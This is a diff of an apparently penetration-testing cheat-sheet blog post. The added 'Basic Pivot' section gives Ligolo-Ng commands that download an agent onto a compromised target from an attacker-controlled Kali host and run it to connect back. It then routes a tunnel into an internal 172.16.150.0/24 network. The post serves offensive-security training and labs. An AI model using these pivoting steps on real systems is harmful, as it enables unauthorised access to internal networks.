@@ -6,7 +6,7 @@ date:   2024-10-31 09:00:00 +0300
 image:  '/images/21.jpg'
 tags:   [Cheatsheets, Tools, Pivoting]
 ---
-# Installing Ligolo-Ng
+# Getting Ligolo-Ng
 Important Note: Make sure you are always using the same version of Proxy and Agent.
 
 ## Download the binaries manually (recommended)
@@ -30,3 +30,45 @@ sudo cp /path/to/ligolo/agent .
 sudo chmod +x agent
 ./agent
 ```
+
+# Basic Pivot
+Move the agent file into the pivot host
+```shell
+# On Kali
+sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
+python3 -m http.server 443
+# On Target
+wget http://<kali_ip>:443/agent
+```
+Set up Ligolo-Ng on Kali
+```shell
+# Create an interface
+sudo ip tuntap add user Vorkharium mode tun ligolo
+sudo ip link set ligolo up
+# Add new IP range we want to access
+sudo ip route add 172.16.150.0/24 dev ligolo
+ip route list
+# Run the proxy file
+sudo chmod +x proxy
+./proxy -selfcert
+# The Ligolo-Ng console will now open (We will interact with it soon)
+```
+
+On the Pivot target, use the agent file to connect
+```shell
+chmod +x agent
+./agent --connect <kali_ip>:11601 -ignore-cert
+```
+
+Now enter the following in the Ligolo-Ng console
+```shell
+# Enter "session" to show the available sessions
+ligolo-ng » session
+# Enter "1" to select the session we created when using the agent (There is only one session to choose in this case)
+? Specify a session : 1
+# Enter "start" to start the connection
+[Agent : hackme@compromisedmachine] » start
+# Now we are able to access the network 172.16.150.0/24
+```
+
+
